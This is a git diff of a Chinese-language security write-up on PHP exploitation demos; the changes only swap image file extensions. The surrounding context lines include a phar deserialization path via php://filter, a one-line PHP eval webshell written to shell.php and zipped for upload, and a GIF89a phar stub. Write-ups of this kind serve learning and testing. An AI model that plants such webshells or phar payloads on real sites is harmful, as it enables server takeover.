@@ -500,7 +500,7 @@ rename("phar.phar", "phar.jpg");
 php://filter/resource=phar://upload/f528764d624db129b32c21fbca0cb8d6/628941e623f5a967093007bf39be805f.jpg
 ```
 
-![image](./assets/003.jpg)
+![image](./assets/003.png)
 
 ## demo4
 
@@ -508,7 +508,7 @@ php://filter/resource=phar://upload/f528764d624db129b32c21fbca0cb8d6/628941e623f
 
 看robots.txt发现版本以及一些路由
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 https://www.seebug.org/vuldb/ssvid-62341  我找到一个这个，但是发现关键文件这里面根本没有
 
@@ -634,11 +634,11 @@ altman777
 
 多了个这个，只要反序列化成功就自动解压，现在找反序列化点，寻找调用这个类的地方
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 有点找不到，可以触发的函数太多了，看web端，
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 发现可以上传图片什么的，但是我进到这里的代码，没看出什么东西，全局搜索下载解压，找到`moban.php`
 
@@ -669,7 +669,7 @@ echo '<?php eval($_POST[1]);' > shell.php
 zip 1.zip shell.php
 ```
 
-![image](./assets/010.jpg)
+![image](./assets/010.png)
 
 位置也知道，并且data目录肯定是有足够权限的，所以写个exp
 
@@ -725,7 +725,7 @@ Connection: close
 
 ```
 
-![image](./assets/011.jpg)
+![image](./assets/011.png)
 
 有个小细节忘了，就是之前我们看admin.php进行删除的时候其实有个函数漏看了，导致一直删不了模版
 
@@ -940,7 +940,7 @@ GIF89a<?php __HALT_COMPILER(); ?>
 �
 ```
 
-![image](./assets/012.jpg)
+![image](./assets/012.png)
 
 ## demo6
 
@@ -1114,5 +1114,5 @@ encoded = urllib.parse.quote(compressed_data)
 print(encoded)
 ```
 
-![image](./assets/013.png)
+![image](./assets/013.webp)
 
